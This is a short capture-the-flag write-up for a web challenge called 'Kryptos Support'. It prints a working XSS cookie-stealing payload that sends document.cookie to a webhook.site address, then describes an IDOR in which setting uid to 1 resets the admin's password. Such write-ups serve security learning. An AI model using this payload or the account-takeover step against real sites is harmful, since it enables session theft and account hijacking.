# Kryptos Support

So we are greeted with a website with some input box, we send a message and see that admin will review ticket:

<figure><img src="../../../../.gitbook/assets/image (8) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

So maybe some sort of XSS where we have to steal cookie?

<figure><img src="../../../../.gitbook/assets/image (9) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

We craft a quick cookie stealer:

```
<script>document.location='https://webhook.site/888b441e-ed74-4bba-8c87-e40f690d376a?c='+document.cookie</script>
```

And get a hit in our webhook:

<figure><img src="../../../../.gitbook/assets/image (10) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

So we capture a session cookie

{% hint style="warning" %}
The payload broke the chal and breaks the redirection lol be careful
{% endhint %}

We see the redirection to /tickets

<figure><img src="../../../../.gitbook/assets/image (12) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

And then we spot /settings:

<figure><img src="../../../../.gitbook/assets/image (13) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../../.gitbook/assets/image (14) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

So we change the password and see the odd request:

<figure><img src="../../../../.gitbook/assets/image (15) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

And from there it is very easy, we change uid to 1 to change the password of the admin and it works, so we can go back to /login and get the flag:

<figure><img src="../../../../.gitbook/assets/image (16) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
